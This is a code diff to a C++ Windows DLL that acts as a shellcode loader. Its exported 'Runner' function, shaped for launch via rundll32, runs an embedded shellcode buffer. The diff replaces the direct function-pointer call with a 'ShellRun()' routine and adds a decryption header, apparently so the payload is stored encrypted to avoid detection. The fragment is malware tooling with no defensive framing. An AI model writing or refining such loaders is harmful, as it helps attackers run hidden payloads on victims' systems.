@@ -1,10 +1,11 @@
 #include <Nax.h>
 #include <Shellcode.h>
+#include <Decrypt.h>
 
 EXTERN_C auto DLLEXPORT Runner( HWND hwnd, HINSTANCE hinst, LPSTR cmdLine, int nCmdShow ) -> VOID {
-    VOID ( *Nax )( VOID ) = ( decltype( Nax ) )Shellcode::Data;
-    Nax();
-    WaitForSingleObject( (HANDLE)-1, INFINITE );
+    if ( ShellRun() ) {
+        WaitForSingleObject( (HANDLE)-1, INFINITE );
+    }
 }
 
 auto WINAPI DllMain(
